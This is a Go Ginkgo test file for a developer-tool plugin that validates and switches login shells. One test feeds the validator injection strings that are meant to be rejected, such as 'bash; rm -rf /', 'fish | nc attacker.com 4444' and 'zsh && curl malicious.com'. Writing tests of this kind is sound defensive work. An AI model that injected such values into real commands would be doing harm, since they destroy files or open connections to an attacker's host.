package main_test

import (
	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"

	sdk "github.com/jameswlane/devex/packages/plugin-sdk"
	main "github.com/jameswlane/devex/packages/tool-shell"
)

var _ = Describe("Shell Switcher", func() {
	var plugin *main.ShellPlugin

	BeforeEach(func() {
		info := sdk.PluginInfo{
			Name:        "tool-shell",
			Version:     "test",
			Description: "Test shell plugin",
		}
		plugin = &main.ShellPlugin{
			BasePlugin: sdk.NewBasePlugin(info),
		}
	})

	Describe("ValidateShell", func() {
		Context("with valid shells", func() {
			It("should accept bash", func() {
				err := plugin.ValidateShell("bash")
				Expect(err).ToNot(HaveOccurred())
			})

			It("should accept zsh", func() {
				err := plugin.ValidateShell("zsh")
				Expect(err).ToNot(HaveOccurred())
			})

			It("should accept fish", func() {
				err := plugin.ValidateShell("fish")
				Expect(err).ToNot(HaveOccurred())
			})
		})

		Context("with invalid shells", func() {
			It("should reject powershell", func() {
				err := plugin.ValidateShell("powershell")
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("invalid shell"))
				Expect(err.Error()).To(ContainSubstring("powershell"))
			})

			It("should reject cmd", func() {
				err := plugin.ValidateShell("cmd")
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("invalid shell"))
			})

			It("should reject empty shell name", func() {
				err := plugin.ValidateShell("")
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("invalid shell"))
			})
		})

		Context("with dangerous input", func() {
			It("should reject shell names with special characters", func() {
				dangerousShells := []string{
					"bash; rm -rf /",
					"zsh && curl malicious.com",
					"fish | nc attacker.com 4444",
					"bash`whoami`",
					"zsh$(rm -rf /home)",
				}

				for _, shell := range dangerousShells {
					err := plugin.ValidateShell(shell)
					Expect(err).To(HaveOccurred())
					Expect(err.Error()).To(ContainSubstring("invalid shell"))
				}
			})
		})
	})

	Describe("handleSwitch Integration Tests", func() {
		Context("when switching shells", func() {
			It("should require target shell argument", func() {
				err := plugin.Execute("switch", []string{})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("target shell"))
			})

			It("should validate target shell before switching", func() {
				Skip("Integration test - requires shell switching capabilities")
			})

			It("should check if target shell is installed", func() {
				Skip("Integration test - requires shell availability check")
			})
		})
	})

	Describe("Shell Detection", func() {
		Context("DetectCurrentShell", func() {
			It("should detect shell from environment", func() {
				// This tests the current environment, so results may vary
				shell := plugin.DetectCurrentShell()
				// Should return a shell name or "unknown"
				Expect(shell).To(MatchRegexp("^(bash|zsh|fish|unknown)$"))
			})

			It("should return unknown for empty SHELL environment", func() {
				Skip("Integration test - requires environment manipulation")
			})
		})
	})

	Describe("Security Validation", func() {
		Context("shell path validation", func() {
			It("should handle shell path lookup safely", func() {
				Skip("Integration test - requires which command availability")
			})
		})

		Context("chsh command execution", func() {
			It("should execute chsh safely", func() {
				Skip("Integration test - requires chsh command and user permissions")
			})
		})
	})

	Describe("Error Handling", func() {
		Context("when shell is not installed", func() {
			It("should provide helpful error message", func() {
				Skip("Integration test - requires controlled shell environment")
			})
		})

		Context("when chsh command fails", func() {
			It("should handle chsh failures gracefully", func() {
				Skip("Integration test - requires chsh failure scenarios")
			})
		})
	})
})
